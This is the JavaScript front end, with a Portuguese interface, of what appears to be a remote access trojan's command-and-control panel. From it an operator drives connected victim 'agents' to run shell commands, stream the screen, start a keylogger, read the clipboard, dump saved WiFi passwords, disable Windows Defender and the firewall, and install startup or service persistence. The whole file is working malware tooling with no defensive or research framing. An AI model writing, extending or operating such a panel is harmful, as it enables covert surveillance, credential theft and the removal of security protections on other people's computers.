const WS_URL = 'ws://localhost:4000';

let ws              = null;
let authToken       = null;
let selectedAgentId = null;
const agentMap      = new Map(); 
let cmdCounter      = 0;
const pendingCmds   = new Map(); 


document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('login-btn').addEventListener('click', doLogin);
  document.getElementById('password').addEventListener('keydown', e => {
    if (e.key === 'Enter') doLogin();
  });
  document.getElementById('logout-btn').addEventListener('click', doLogout);
  document.getElementById('terminal-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') sendCommand();
  });

  
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => switchTab(tab.dataset.tab));
  });

  connectWebSocket();
});


function connectWebSocket() {
  setLoginStatus('Conectando ao servidor...');
  ws = new WebSocket(WS_URL);

  ws.onopen = () => {
    setLoginStatus('Conectado. Aguardando autenticação.');
  };

  ws.onclose = () => {
    setLoginStatus('Conexão perdida. Recarregue a página.');
    if (authToken) showLogin();
  };

  ws.onerror = () => {
    setLoginStatus('Erro ao conectar. Verifique se o servidor está rodando.');
  };

  ws.onmessage = (event) => {
    let msg;
    try { msg = JSON.parse(event.data); } catch { return; }
    handleMessage(msg);
  };
}


function handleMessage(msg) {
  switch (msg.type) {

    case 'auth_success':
      authToken = msg.token;
      
      (msg.agents || []).forEach(a => {
        agentMap.set(a.agentId, a.info);
        renderAgentItem(a.agentId, a.info);
      });
      updateAgentCount();
      showDashboard();
      break;

    case 'auth_failed':
      showLoginError('Senha incorreta. Tente novamente.');
      break;

    case 'agent_connected':
      agentMap.set(msg.agentId, msg.info);
      renderAgentItem(msg.agentId, msg.info);
      updateAgentCount();
      appendTerminalLine(`[+] Agente conectado: ${msg.agentId}`, 'info');
      break;

    case 'agent_disconnected':
      agentMap.delete(msg.agentId);
      removeAgentItem(msg.agentId);
      updateAgentCount();
      if (selectedAgentId === msg.agentId) {
        selectedAgentId = null;
        showNoAgentPanel();
      }
      break;

    case 'command_result':
      if (msg.agentId === selectedAgentId) {
        appendTerminalLine(msg.output || msg.error || '(sem saída)', msg.error ? 'error' : 'terminal-line');
        
        handleCommandResult(msg.commandId, msg.output || msg.error, msg.error);
      }
      if (pendingCmds.has(msg.commandId)) {
        pendingCmds.get(msg.commandId)(msg);
        pendingCmds.delete(msg.commandId);
      }
      break;

    case 'data':
      if (msg.agentId === selectedAgentId) {
        handleData(msg.dataType, msg.payload);
      }
      break;

    case 'error':
      console.error('[Server]', msg.message);
      break;
  }
}


function handleData(dataType, payload) {
  switch (dataType) {
    case 'sysinfo':      renderSysInfo(payload);    break;
    case 'processes':    renderProcesses(payload);  break;
    case 'files':        renderFiles(payload);       break;
    case 'screenshot':   renderScreenshot(payload); break;
    case 'netinfo':      renderNetInfo(payload);    break;
    case 'software':     renderSoftware(payload);   break;
    case 'clipboard':    renderClipboard(payload);  break;
    case 'stream_frame': renderStreamFrame(payload); break;
    case 'disk_info':    renderDiskInfo(payload);   break;
    case 'startup_programs': renderStartupPrograms(payload); break;
    case 'wifi_passwords': renderWifiPasswords(payload); break;
    case 'services':     renderServices(payload);   break;
  }
}

function renderDiskInfo(data) {
  const el = document.getElementById('disk-output');
  if (!data || data.length === 0) {
    el.innerHTML = '<span style="color:var(--text-dim);">Nenhum disco encontrado.</span>';
    return;
  }
  let html = '';
  data.forEach(d => {
    html += `<div style="margin-bottom:8px;padding:8px;background:var(--surface3);border-radius:4px;">
      <strong>${escHtml(d.drive)}</strong> - ${escHtml(d.type)}<br>
      <span style="font-size:11px;">Label: ${escHtml(d.label)} | Total: ${escHtml(d.total)} | Livre: ${escHtml(d.free)}</span>
    </div>`;
  });
  el.innerHTML = html;
}

function renderStartupPrograms(data) {
  const el = document.getElementById('startup-output');
  if (!data || data.length === 0) {
    el.innerHTML = '<span style="color:var(--text-dim);">Nenhum programa de inicialização encontrado.</span>';
    return;
  }
  let html = '';
  data.forEach(p => {
    html += `<div style="margin-bottom:6px;"><strong>${escHtml(p.name)}</strong> (${escHtml(p.location)})<br><span style="font-size:10px;color:var(--text-mute);">${escHtml(p.command)}</span></div>`;
  });
  el.innerHTML = html;
}

function renderWifiPasswords(data) {
  const el = document.getElementById('wifi-output');
  if (!data || data.length === 0) {
    el.innerHTML = '<span style="color:var(--text-dim);">Nenhuma rede WiFi salva encontrada.</span>';
    return;
  }
  let html = '';
  data.forEach(w => {
    html += `<div style="margin-bottom:6px;padding:6px;background:var(--surface3);border-radius:4px;">
      <strong>${escHtml(w.ssid)}</strong><br>
      <span style="font-family:var(--mono);font-size:11px;color:var(--success);">${escHtml(w.password)}</span>
    </div>`;
  });
  el.innerHTML = html;
}

function renderServices(data) {
  const el = document.getElementById('services-output');
  if (!data || data.length === 0) {
    el.innerHTML = '<span style="color:var(--text-dim);">Nenhum serviço encontrado.</span>';
    return;
  }
  let html = '';
  data.slice(0, 50).forEach(s => {
    const stateColor = s.state === 'Running' ? 'var(--success)' : 'var(--text-mute)';
    html += `<div style="margin-bottom:4px;"><strong>${escHtml(s.name)}</strong> - <span style="color:${stateColor};">${escHtml(s.state)}</span></div>`;
  });
  if (data.length > 50) html += `<div style="margin-top:10px;color:var(--text-dim);">... e mais ${data.length - 50} serviços</div>`;
  el.innerHTML = html;
}


function doLogin() {
  const password = document.getElementById('password').value;
  if (!password) return;
  hideLoginError();
  ws.send(JSON.stringify({ type: 'operator_auth', password }));
}

function doLogout() {
  authToken = null;
  selectedAgentId = null;
  agentMap.clear();
  document.getElementById('agent-list').innerHTML = '<div class="no-agents">Nenhum agente conectado</div>';
  document.getElementById('password').value = '';
  showLogin();
}


function showLogin()     { switchScreen('login-screen'); }
function showDashboard() { switchScreen('dashboard-screen'); }

function switchScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function setLoginStatus(msg) {
  const el = document.getElementById('login-status');
  el.textContent = msg;
  el.classList.remove('hidden');
}

function showLoginError(msg) {
  const el = document.getElementById('login-error');
  el.textContent = msg;
  el.classList.remove('hidden');
}

function hideLoginError() {
  document.getElementById('login-error').classList.add('hidden');
}


function renderAgentItem(agentId, info) {
  
  const noAgents = document.querySelector('.no-agents');
  if (noAgents) noAgents.remove();

  const list = document.getElementById('agent-list');
  const el = document.createElement('div');
  el.className = 'agent-item';
  el.id = `agent-item-${agentId}`;
  el.dataset.agentId = agentId;

  el.innerHTML = `
    <div class="agent-hostname"><span class="agent-dot"></span>${info.hostname || 'Desconhecido'}</div>
    <div class="agent-os">${info.os || ''}</div>
    <div class="agent-ip">${info.ip || agentId}</div>
  `;
  el.addEventListener('click', () => selectAgent(agentId));
  list.appendChild(el);
}

function removeAgentItem(agentId) {
  const el = document.getElementById(`agent-item-${agentId}`);
  if (el) el.remove();
  if (document.getElementById('agent-list').children.length === 0) {
    document.getElementById('agent-list').innerHTML = '<div class="no-agents">Nenhum agente conectado</div>';
  }
}

function updateAgentCount() {
  document.getElementById('agent-count').textContent = agentMap.size;
}

function showNoAgentPanel() {
  document.getElementById('no-agent-panel').classList.add('active');
  document.getElementById('agent-panel').classList.remove('active');
  document.getElementById('topbar-title').textContent = 'Selecione um agente';
}

function showAgentPanel() {
  document.getElementById('no-agent-panel').classList.remove('active');
  document.getElementById('agent-panel').classList.add('active');
}


function switchTab(tabId) {
  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabId));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.toggle('active', c.id === `tab-${tabId}`));
}


function sendMsg(payload) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(payload));
  }
}

function sendAgentCommand(command, args = []) {
  if (!selectedAgentId) return null;
  const commandId = `cmd-${++cmdCounter}`;
  sendMsg({ type: 'command', agentId: selectedAgentId, commandId, command, args });
  return commandId;
}




function requestSysInfo() {
  document.getElementById('sysinfo-grid').innerHTML = '<div class="info-placeholder">Carregando...</div>';
  sendAgentCommand('sysinfo');
}

function renderSysInfo(data) {
  const grid = document.getElementById('sysinfo-grid');
  const fields = [
    { label: 'Hostname',         value: data.hostname },
    { label: 'Usuário',          value: data.username },
    { label: 'Sistema Operacional', value: data.os },
    { label: 'Arquitetura',      value: data.arch },
    { label: 'CPU',              value: data.cpu },
    { label: 'Núcleos',          value: data.cores },
    { label: 'RAM Total',        value: data.ram_total },
    { label: 'RAM Livre',        value: data.ram_free },
    { label: 'Endereço IP',      value: data.ip },
    { label: 'Uptime',           value: data.uptime },
    { label: 'Diretório Atual',  value: data.cwd },
  ];
  grid.innerHTML = fields
    .filter(f => f.value)
    .map(f => `<div class="info-card"><div class="label">${f.label}</div><div class="value">${escHtml(f.value)}</div></div>`)
    .join('');
}


function requestProcesses() {
  document.getElementById('process-tbody').innerHTML =
    '<tr><td colspan="4" class="placeholder-row">Carregando...</td></tr>';
  sendAgentCommand('processes');
}

function renderProcesses(data) {
  const tbody = document.getElementById('process-tbody');
  if (!data || data.length === 0) {
    tbody.innerHTML = '<tr><td colspan="4" class="placeholder-row">Nenhum processo encontrado.</td></tr>';
    return;
  }
  tbody.innerHTML = data.map(p => `
    <tr>
      <td>${escHtml(String(p.pid))}</td>
      <td>${escHtml(p.name)}</td>
      <td>${escHtml(String(p.mem_kb))}</td>
      <td><button class="btn btn-sm btn-danger" style="padding:3px 10px;font-size:11px;" onclick="killProcess(${p.pid})">Kill</button></td>
    </tr>`).join('');
}

function killProcess(pid) {
  if (!confirm(`Encerrar processo PID ${pid}?`)) return;
  sendAgentCommand('kill', [String(pid)]);
}


function requestFiles() {
  const path = document.getElementById('path-input').value.trim() || 'C:\\';
  document.getElementById('file-tbody').innerHTML =
    '<tr><td colspan="4" class="placeholder-row">Carregando...</td></tr>';
  sendAgentCommand('listdir', [path]);
}

function renderFiles(data) {
  const tbody = document.getElementById('file-tbody');
  if (!data || data.length === 0) {
    tbody.innerHTML = '<tr><td colspan="4" class="placeholder-row">Diretório vazio ou inacessível.</td></tr>';
    return;
  }

  
  const currentPath = document.getElementById('path-input').value;
  let backRow = '';
  const parentPath = getParentPath(currentPath);
  if (parentPath !== currentPath) {
    backRow = `<tr><td>📁</td><td class="file-dir" onclick="navigateTo('${escAttr(parentPath)}')">..</td><td></td><td></td></tr>`;
  }

  tbody.innerHTML = backRow + data.map(f => {
    const isDir = f.type === 'dir';
    const nameCell = isDir
      ? `<td class="file-dir" onclick="navigateTo('${escAttr(f.path)}')">${escHtml(f.name)}</td>`
      : `<td>${escHtml(f.name)}</td>`;
    return `<tr><td>${isDir ? '📁' : '📄'}</td>${nameCell}<td>${escHtml(f.size || '')}</td><td>${escHtml(f.modified || '')}</td></tr>`;
  }).join('');
}

function navigateTo(path) {
  document.getElementById('path-input').value = path;
  requestFiles();
}

function getParentPath(p) {
  const parts = p.replace(/\\/g, '/').replace(/\/$/, '').split('/');
  if (parts.length <= 1) return p;
  parts.pop();
  return parts.join('\\') + '\\';
}


function sendCommand() {
  const input = document.getElementById('terminal-input');
  const cmd = input.value.trim();
  if (!cmd || !selectedAgentId) return;
  input.value = '';

  appendTerminalLine(`C:\\> ${cmd}`, 'command');
  sendAgentCommand('exec', [cmd]);
}

function clearTerminal() {
  document.getElementById('terminal-output').innerHTML = '';
}

function appendTerminalLine(text, cls = 'terminal-line') {
  const terminal = document.getElementById('terminal-output');
  const line = document.createElement('div');
  line.className = `terminal-line ${cls}`;
  line.textContent = text;
  terminal.appendChild(line);
  terminal.scrollTop = terminal.scrollHeight;
}


function requestScreenshot() {
  const container = document.getElementById('screenshot-container');
  container.innerHTML = '<div class="info-placeholder">Capturando tela...</div>';
  sendAgentCommand('screenshot');
}

function renderScreenshot(data) {
  const container = document.getElementById('screenshot-container');
  if (!data || !data.image) {
    container.innerHTML = '<div class="info-placeholder">Falha ao capturar screenshot.</div>';
    return;
  }
  const timestamp = new Date().toLocaleTimeString();
  container.innerHTML = `
    <div style="display:flex;flex-direction:column;gap:8px;align-items:center;width:100%">
      <span style="font-size:11px;color:var(--text-dim)">Capturado às ${timestamp}</span>
      <img src="data:image/png;base64,${data.image}" alt="Screenshot" />
    </div>`;
}


function escHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function escAttr(str) {
  return String(str ?? '').replace(/'/g, "\\'");
}


let streamActive      = false;
let streamFrameCount  = 0;
let streamFpsTimer    = null;
let streamLastFps     = 0;

function startLiveView() {
  if (!selectedAgentId) return;
  const fps     = parseInt(document.getElementById('stream-fps').value)     || 5;
  const quality = parseInt(document.getElementById('stream-quality').value) || 50;
  const scale   = parseInt(document.getElementById('stream-scale').value)   || 75;

  sendAgentCommand('stream_start', [String(fps), String(quality), String(scale)]);
  streamActive     = true;
  streamFrameCount = 0;

  document.getElementById('stream-start-btn').disabled = true;
  document.getElementById('stream-stop-btn').disabled  = false;
  document.getElementById('stream-status').textContent  = '🔴 Transmitindo';
  document.getElementById('stream-status').style.color  = 'var(--danger)';

  
  streamFpsTimer = setInterval(() => {
    streamLastFps = streamFrameCount;
    streamFrameCount = 0;
    document.getElementById('stream-fps-actual').textContent =
      `${streamLastFps} fps reais`;
  }, 1000);
}

function stopLiveView() {
  if (!selectedAgentId) return;
  sendAgentCommand('stream_stop');
  streamActive = false;

  clearInterval(streamFpsTimer);
  streamFpsTimer = null;

  document.getElementById('stream-start-btn').disabled = false;
  document.getElementById('stream-stop-btn').disabled  = true;
  document.getElementById('stream-status').textContent  = 'Parado';
  document.getElementById('stream-status').style.color  = 'var(--text-mute)';
  document.getElementById('stream-fps-actual').textContent = '';
  document.getElementById('stream-size').textContent = '';
}

function renderStreamFrame(data) {
  if (!data?.image) return;
  streamFrameCount++;

  const canvas = document.getElementById('stream-canvas');
  if (!canvas) return;

  const img   = new Image();
  img.onload  = () => {
    
    if (canvas.width !== img.width || canvas.height !== img.height) {
      canvas.width  = img.width;
      canvas.height = img.height;
    }
    const ctx = canvas.getContext('2d');
    ctx.drawImage(img, 0, 0);
  };
  img.src = 'data:image/jpeg;base64,' + data.image;

  
  const kb = Math.round(data.image.length * 0.75 / 1024);
  document.getElementById('stream-size').textContent = `~${kb} KB/frame`;
}


function selectAgent(agentId) {
  
  if (streamActive && selectedAgentId) {
    sendAgentCommand('stream_stop');
    streamActive = false;
    clearInterval(streamFpsTimer);
    streamFpsTimer = null;
  }

  selectedAgentId = agentId;

  document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('selected'));
  const el = document.getElementById(`agent-item-${agentId}`);
  if (el) el.classList.add('selected');

  const info = agentMap.get(agentId) || {};
  document.getElementById('topbar-title').textContent = `${info.hostname || agentId} — ${info.os || ''}`;

  
  document.getElementById('stream-start-btn').disabled = false;
  document.getElementById('stream-stop-btn').disabled  = true;
  document.getElementById('stream-status').textContent  = 'Inativo';
  document.getElementById('stream-status').style.color  = 'var(--text-mute)';
  const ctx = document.getElementById('stream-canvas')?.getContext('2d');
  if (ctx) ctx.clearRect(0, 0, 9999, 9999);

  showAgentPanel();
  switchTab('sysinfo');
  requestSysInfo();
}


function requestNetInfo() {
  document.getElementById('network-tbody').innerHTML =
    '<tr><td colspan="5" class="placeholder-row">Carregando...</td></tr>';
  sendAgentCommand('netinfo');
}

function renderNetInfo(data) {
  const tbody = document.getElementById('network-tbody');
  if (!data || data.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" class="placeholder-row">Nenhuma interface encontrada.</td></tr>';
    return;
  }
  tbody.innerHTML = data.map(n => {
    const statusColor = n.status === 'Up' ? 'var(--success)' : 'var(--text-mute)';
    return `<tr>
      <td><strong>${escHtml(n.name)}</strong><br><span style="font-size:11px;color:var(--text-dim)">${escHtml(n.description)}</span></td>
      <td><span style="color:${statusColor};font-weight:600;">${escHtml(n.status)}</span></td>
      <td style="font-family:var(--mono);font-size:12px;">${escHtml(n.mac)}</td>
      <td style="font-family:var(--mono);font-size:12px;">${escHtml(n.ips)}</td>
      <td style="font-family:var(--mono);font-size:12px;">${escHtml(n.gateway)}</td>
    </tr>`;
  }).join('');
}


let softwareCache = [];

function requestSoftware() {
  document.getElementById('software-tbody').innerHTML =
    '<tr><td colspan="4" class="placeholder-row">Carregando... (pode demorar alguns segundos)</td></tr>';
  sendAgentCommand('software');
}

function renderSoftware(data) {
  softwareCache = data || [];
  filterSoftware();
}

function filterSoftware() {
  const filter = (document.getElementById('software-filter')?.value || '').toLowerCase();
  const tbody  = document.getElementById('software-tbody');
  const list   = filter
    ? softwareCache.filter(s => s.name.toLowerCase().includes(filter) ||
                                s.publisher.toLowerCase().includes(filter))
    : softwareCache;

  if (list.length === 0) {
    tbody.innerHTML = '<tr><td colspan="4" class="placeholder-row">Nenhum programa encontrado.</td></tr>';
    return;
  }
  tbody.innerHTML = list.map(s => `
    <tr>
      <td>${escHtml(s.name)}</td>
      <td style="font-size:12px;color:var(--text-dim)">${escHtml(s.version)}</td>
      <td style="font-size:12px;color:var(--text-dim)">${escHtml(s.publisher)}</td>
      <td style="font-size:12px;color:var(--text-dim)">${escHtml(s.date)}</td>
    </tr>`).join('');
}


function requestClipboardGet() {
  const el = document.getElementById('clipboard-content');
  el.innerHTML = '<span style="color:var(--text-dim)">Lendo clipboard...</span>';
  sendAgentCommand('clipboard_get');
}

function renderClipboard(data) {
  const el = document.getElementById('clipboard-content');
  const content = data?.content || '';
  if (!content) {
    el.innerHTML = '<span style="color:var(--text-mute)">Clipboard vazio.</span>';
    return;
  }
  el.textContent = content;
}

function requestClipboardSet() {
  const text = document.getElementById('clipboard-write').value;
  if (!text) return;
  sendAgentCommand('clipboard_set', [text]);
  document.getElementById('clipboard-write').value = '';
  appendTerminalLine('[clipboard] Texto enviado ao clipboard remoto.', 'info');
}

function requestDiskInfo() {
  document.getElementById('disk-output').innerHTML = 'Carregando...';
  sendAgentCommand('disk_info');
}

function requestStartupPrograms() {
  document.getElementById('startup-output').innerHTML = 'Carregando...';
  sendAgentCommand('startup_programs');
}

function requestWifiPasswords() {
  document.getElementById('wifi-output').innerHTML = 'Carregando...';
  sendAgentCommand('wifi_passwords');
}

function keyloggerStart() {
  sendAgentCommand('keylogger_start');
  appendTerminalLine('[Keylogger] Iniciado', 'info');
}

function keyloggerStop() {
  sendAgentCommand('keylogger_stop');
  appendTerminalLine('[Keylogger] Parado', 'info');
}

function keyloggerGetLogs() {
  sendAgentCommand('keylogger_logs');
}

function getActiveWindow() {
  sendAgentCommand('active_window');
}

function requestServices() {
  document.getElementById('services-output').innerHTML = 'Carregando...';
  sendAgentCommand('services');
}

function registryRead() {
  const key = document.getElementById('reg-key').value.trim();
  const value = document.getElementById('reg-value').value.trim();
  if (!key || !value) return alert('Preencha chave e valor.');
  
  sendAgentCommand('registry_read', [key, value]);
}

function requestEnvVars() {
  document.getElementById('env-output').innerHTML = 'Carregando...';
  sendAgentCommand('env_vars');
}

function lockWorkstation() {
  if (!confirm('Bloquear estação de trabalho remota?')) return;
  sendAgentCommand('lock_workstation');
}

function logoffUser() {
  if (!confirm('Fazer logout do usuário remoto?')) return;
  sendAgentCommand('logoff_user');
}

function shutdownSystem() {
  if (!confirm('Desligar sistema remoto?')) return;
  const delay = prompt('Delay em segundos:', '30');
  if (delay) sendAgentCommand('shutdown_system', [delay]);
}

function rebootSystem() {
  if (!confirm('Reiniciar sistema remoto?')) return;
  const delay = prompt('Delay em segundos:', '30');
  if (delay) sendAgentCommand('reboot_system', [delay]);
}

function disableFirewall() {
  if (!confirm('Desabilitar Firewall do Windows?')) return;
  sendAgentCommand('disable_firewall');
}

function enableFirewall() {
  sendAgentCommand('enable_firewall');
}

function getFirewallRules() {
  sendAgentCommand('firewall_rules');
}

function disableDefender() {
  if (!confirm('Desabilitar Windows Defender? (requer privilégios)')) return;
  sendAgentCommand('disable_defender');
}

function enableDefender() {
  sendAgentCommand('enable_defender');
}

function getDefenderStatus() {
  sendAgentCommand('defender_status');
}

function addStartupPersistence() {
  const name = document.getElementById('persist-name').value.trim();
  const path = document.getElementById('persist-path').value.trim();
  if (!name || !path) return alert('Preencha nome e caminho.');
  sendAgentCommand('persist_startup', [name, path]);
  appendTerminalLine(`[Persistência] Adicionado ao startup: ${name}`, 'info');
}

function addServicePersistence() {
  const name = document.getElementById('persist-name').value.trim();
  const path = document.getElementById('persist-path').value.trim();
  if (!name || !path) return alert('Preencha nome e caminho.');
  sendAgentCommand('persist_service', [name, path]);
  appendTerminalLine(`[Persistência] Criado serviço: ${name}`, 'info');
}


function handleCommandResult(commandId, output, isError) {
  if (isError) return;
  
  try {
    if (output.startsWith('{') || output.startsWith('[')) {
      const data = JSON.parse(output);
      
      if (data.title !== undefined && data.process !== undefined) {
        const el = document.getElementById('window-output');
        if (el) {
          el.innerHTML = `<strong>Título:</strong> ${escHtml(data.title)}<br><strong>Processo:</strong> ${escHtml(data.process)}<br><strong>PID:</strong> ${data.pid}`;
        }
      }
      
      else if (data.value !== undefined) {
        const el = document.getElementById('reg-output');
        if (el) {
          el.textContent = data.value || '(vazio)';
        }
      }
      
      else if (typeof data === 'object' && !Array.isArray(data) && Object.keys(data).length > 0) {
        if (Object.keys(data).some(k => typeof data[k] === 'string' && data[k].length > 0)) {
          const el = document.getElementById('env-output');
          if (el && el.innerHTML.includes('Carregando')) {
            let html = '';
            for (const [name, value] of Object.entries(data)) {
              html += `<div style="margin-bottom:3px;"><strong>${escHtml(name)}:</strong> ${escHtml(value)}</div>`;
            }
            el.innerHTML = html || 'Nenhuma variável encontrada.';
          }
          
          const keylogEl = document.getElementById('keylog-output');
          if (keylogEl) {
            let html = '';
            for (const [window, keys] of Object.entries(data)) {
              if (keys) html += `<strong>${escHtml(window)}</strong><br>${escHtml(keys)}<br><br>`;
            }
            if (html) keylogEl.innerHTML = html;
            else if (!keylogEl.innerHTML) keylogEl.innerHTML = '<span style="color:var(--text-dim);">Nenhum log capturado ainda.</span>';
          }
        }
      }
    }
  } catch (e) {
  }
}

